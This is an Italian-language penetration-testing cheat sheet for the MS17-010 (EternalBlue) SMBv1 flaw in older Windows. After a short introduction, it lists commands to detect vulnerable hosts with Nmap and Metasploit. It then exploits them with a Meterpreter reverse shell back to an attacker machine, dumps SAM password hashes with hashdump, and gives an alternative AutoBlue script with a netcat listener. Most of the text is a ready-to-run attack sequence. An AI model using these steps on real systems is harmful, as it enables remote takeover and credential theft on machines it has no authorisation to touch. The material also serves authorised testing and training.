# Microsoft Windows – Exploitation di MS17-010 (EternalBlue)

**EternalBlue** è un exploit che sfrutta la vulnerabilità nota come **MS17-010**, una falla critica nel protocollo SMBv1 scoperta e resa pubblica nel 2017. Questa vulnerabilità permette ad un attaccante di eseguire codice arbitrario da remoto con privilegi SYSTEM, senza bisogno di autenticazione. <br>
È stata inizialmente sviluppata dalla NSA e poi resa pubblica dal gruppo Shadow Brokers. La sua fama è dovuta all’utilizzo in attacchi su larga scala come WannaCry e NotPetya.

Questa falla è presente su molte versioni di Windows, tra cui Windows XP, Windows 7 e Windows Server 2008, specialmente nei sistemi che non sono stati aggiornati dopo il rilascio della patch **MS17-010** da parte di Microsoft.

---

## 1 – Rilevazione della vulnerabilità

Per verificare la vulnerabilità con **Nmap**: <br>
`nmap -p445 --script smb-vuln-ms17-010 <IP>` ⟶ verifica se il target è vulnerabile a EternalBlue. <br>

Oppure con **Metasploit**:<br>
`use auxiliary/scanner/smb/smb_ms17_010` ⟶ carica lo scanner SMB per EternalBlue. <br>
`set RHOSTS <IP>` ⟶ imposta il target. <br>
`run` ⟶ avvia la scansione. <br>

---

## 2 – Sfruttamento con Metasploit

Una volta confermata la vulnerabilità, possiamo sfruttarla tramite Metasploit: <br>
`use exploit/windows/smb/ms17_010_eternalblue` ⟶ modulo per EternalBlue. <br>
`set RHOSTS <IP>` ⟶ imposta l’indirizzo del target. <br>
`set SMBPIPE BROWSER` ⟶ specifica la pipe SMB (di default). <br>
`set PAYLOAD windows/x64/meterpreter/reverse_tcp` ⟶ payload Meterpreter. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina Kali. <br>
`set LPORT <Port>` ⟶ porta configurata per la reverse shell. <br>
`run` ⟶ esegue l’exploit. <br>

---

## 3 – Post-Sfruttamento

Una volta ottenuta una sessione Meterpreter: <br>
`getuid` ⟶ mostra l’utente corrente. <br>
`getprivs` ⟶ elenca i privilegi. <br>
`hashdump` ⟶ estrae gli hash delle password dal SAM. <br>

---

## 4 – Alternativa con AutoBlue-MS17-010

In alternativa a Metasploit, si può usare lo script Python **AutoBlue-MS17-010** disponibile su <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">GitHub</a> <br>
`cd AutoBlue-MS17-010/shellcode` <br>
`chmod +x shell_prep.sh` <br>
`./shell_prep.sh` ⟶ prepara la shellcode per il payload. <br>
`nc -nvlp 4444` ⟶ avvia listener Netcat. <br>
`python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin` ⟶ esegue l’exploit. <br>

---
